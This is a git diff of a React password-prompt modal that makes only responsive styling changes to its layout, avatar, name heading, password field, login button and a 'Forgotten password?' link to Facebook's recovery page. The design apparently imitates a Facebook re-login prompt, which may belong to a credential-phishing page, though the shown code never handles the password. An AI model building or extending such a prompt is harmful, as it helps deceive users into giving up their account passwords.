@@ -80,11 +80,11 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
         <>
             {/* Overlay mờ toàn màn hình */}
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
-            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-2 md:px-4'>
-                <div className='flex max-h-[90vh] w-full max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-2 md:p-4'>
-                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center gap-4 py-6'>
+            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-2 sm:px-3 md:px-4'>
+                <div className='flex max-h-[90vh] w-full max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-2 sm:p-3 md:p-4'>
+                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center gap-3 sm:gap-4 py-4 sm:py-6'>
                         {/* Profile Image */}
-                        <div className='h-24 w-24 rounded-full overflow-hidden border-2 border-gray-300 bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center'>
+                        <div className='h-20 sm:h-24 w-20 sm:w-24 rounded-full overflow-hidden border-2 border-gray-300 bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center flex-shrink-0'>
                             {userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? (
                                 <Image
                                     src={userProfileImage}
@@ -94,17 +94,17 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                                     className='w-full h-full object-cover'
                                 />
                             ) : (
-                                <div className='text-white text-3xl font-bold'>
+                                <div className='text-white text-2xl sm:text-3xl font-bold'>
                                     {userName.charAt(0).toUpperCase()}
                                 </div>
                             )}
                         </div>
 
                         {/* User Name */}
-                        <h2 className='text-2xl font-bold text-center truncate max-w-xs'>{userName}</h2>
+                        <h2 className='text-lg sm:text-2xl font-bold text-center truncate max-w-xs'>{userName}</h2>
 
                         {/* Password Input */}
-                        <div className='w-full px-4'>
+                        <div className='w-full px-2 sm:px-4'>
                             <div className='relative w-full'>
                                 <input
                                     type={showPassword ? 'text' : 'password'}
@@ -112,7 +112,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                                     onChange={e => {
                                         setPassword(e.target.value);
                                     }}
-                                    className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-sm md:text-base'
+                                    className='h-12 sm:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-xs sm:text-sm md:text-base'
                                     required
                                     autoComplete='new-password'
                                     placeholder={t('Password')}
@@ -127,11 +127,11 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                         </div>
 
                         {/* Log In Button */}
-                        <div className='w-full px-4 mt-2'>
+                        <div className='w-full px-2 sm:px-4 mt-2'>
                             <button
                                 type='submit'
                                 disabled={isLoading}
-                                className={`flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${
+                                className={`flex h-12 sm:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-sm sm:text-base text-white transition-colors hover:bg-blue-700 ${
                                     isLoading ? 'cursor-not-allowed opacity-80' : ''
                                 }`}
                             >
@@ -144,7 +144,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                         </div>
 
                         {/* Forgotten Password Link */}
-                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-sm text-center text-blue-600 hover:underline mt-2'>
+                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-sm text-center text-blue-600 hover:underline mt-2'>
                             {t('Forgotten password?')}
                         </a>
                     </form>
